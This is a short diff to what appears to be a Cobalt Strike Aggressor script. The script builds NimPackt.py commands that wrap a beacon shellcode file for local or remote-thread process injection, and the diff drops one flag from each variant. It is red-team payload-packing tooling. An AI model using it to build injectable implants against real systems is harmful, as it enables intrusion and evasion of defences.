@@ -4,17 +4,17 @@ sub compile {
         # Get the base command based on the chosen option
         if (%options["injectiontype"] eq "local thread") {
 
-                @command = @("python3", script_resource("NimPackt.py"), "-i", "/tmp/beacon.bin", "-e", "shinject", "-H", "-f", %options["filetype"]);
+                @command = @("python3", script_resource("NimPackt.py"), "-i", "/tmp/beacon.bin", "-e", "shinject", "-f", %options["filetype"]);
 
         }
         else if (%options["injectiontype"] eq "remote thread, sacrificial process") {
 
-                @command = @("python3", script_resource("NimPackt.py"), "-i", "/tmp/beacon.bin", "-e", "shinject", "-H", "-r", "-t", %options["targetproc"], "-f", %options["filetype"]);
+                @command = @("python3", script_resource("NimPackt.py"), "-i", "/tmp/beacon.bin", "-e", "shinject", "-r", "-t", %options["targetproc"], "-f", %options["filetype"]);
             
         }
         else {
 
-                @command = @("python3", script_resource("NimPackt.py"), "-i", "/tmp/beacon.bin", "-e", "shinject", "-H", "-r", "-E", "-t", %options["targetproc"], "-f", %options["filetype"]);
+                @command = @("python3", script_resource("NimPackt.py"), "-i", "/tmp/beacon.bin", "-e", "shinject", "-r", "-E", "-t", %options["targetproc"], "-f", %options["filetype"]);
 
         }
 
